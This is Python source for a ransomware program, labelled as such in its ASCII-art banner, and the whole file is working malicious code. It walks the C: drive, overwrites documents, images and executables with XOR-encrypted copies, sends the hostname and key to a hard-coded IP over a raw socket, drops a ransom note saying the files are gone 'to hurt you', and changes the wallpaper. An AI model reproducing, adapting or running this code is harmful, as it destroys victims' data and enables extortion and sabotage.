import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
import time
import requests
import ctypes

safegard = input('PLease enter safegard : ')
if safegard != 'Death':
    quit()


def Desgin_2():
    print(
        """

                                        ,-.
                                       ( O_)
                                      / `-/
                                     /-. /
                                    /   )
                                   /   /  
                      _           /-. /
                     (_)*-._     /   )
                       *-._ *-'**( )/    
                           *-/*-._* `. 
                            /     *-.'._
                           /\       /-._*-._
            _,---...__    /  ) _,-*/    *-(_)
        ___<__(|) _   **-/  / /   /
         '  `----' **-.   \/ /   /
                       )  ] /   /
               ____..-'   //   /                       )
           ,-**      __.,'/   /   ___                 /,
          /    ,--**/  / /   /,-**   ***-.          ,'/
         [    (    /  / /   /  ,.---,_   `._   _,-','
          \    `-./  / /   /  /       `-._  *** ,-'
           `-._  /  / /   /_,'            **--*
               */  / /   /*         
               /  / /   /
              /  / /   /  
             /  |,'   /  
            :   /    /
            [  /   ,'     ~>RANSOMEWARE<~
            | /  ,'      ~~>Created By Ahmed-Shams<~~
            |/,-'
            '

        """

    )
    print('---------------------------------------------------')
    time.sleep(2)


encrypted_ext = (
'.txt', '.AIFF', '.AU', '.BAT', '.BMP', '.CLASS ', '.JAVA', '.CSV', '.CVS', '.DBF', '.DIF', '.DOC', '.DOCX', '.EPS',
'.EXE', '.FM3', '.GIF', '.HQX', '.HTM', '.HTML', '.JPEG', '.JPG', '.MAC', '.MAP', '.MDB', '.MID', '.PNG', '.PPT',
'.PPTX')

file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root + '\\' + file)
        if file_ext in encrypted_ext:
            file_paths.append(root + '\\' + file)

key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))
for i in range(encryption_level):
    key += random.choice(char_pool)

hostname = os.getenv('COMPUTERNAME')


def Connection():
    ip_address = '192.168.1.5'
    port = 5678
    time = datetime.now()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port))
            s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))
    except:
        pass


def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
            print(f'{file} was Encrypted')
        except:
            print(f'Failed to Encrypt {file}')
        q.task_done()


def ransom_note():
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write(f'''
        GOOD Evening.
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
and the key deleted itself.
there is no way to decrypt Your file now.
We only did it to hurt you.
hope you having a great day.
with Love :) 
''')


def show_ransom_note():
    # Open the ransom note
    osCommandString = "notepad.exe RANSOM_NOTE.txt"
    os.system(osCommandString)


def Set_wallpaper():
    response = requests.get("https://wallpaperaccess.com/full/1267571.jpg")

    file = open("sample_image.png", "wb")

    file.write(response.content)

    file.close()

    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/IEUser/Desktop/sample_image.png", 0)


Desgin_2()
q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()

print('Encryption Completed')
print('KEY HAS BEEN DELETED')

ransom_note()
show_ransom_note()
Set_wallpaper()

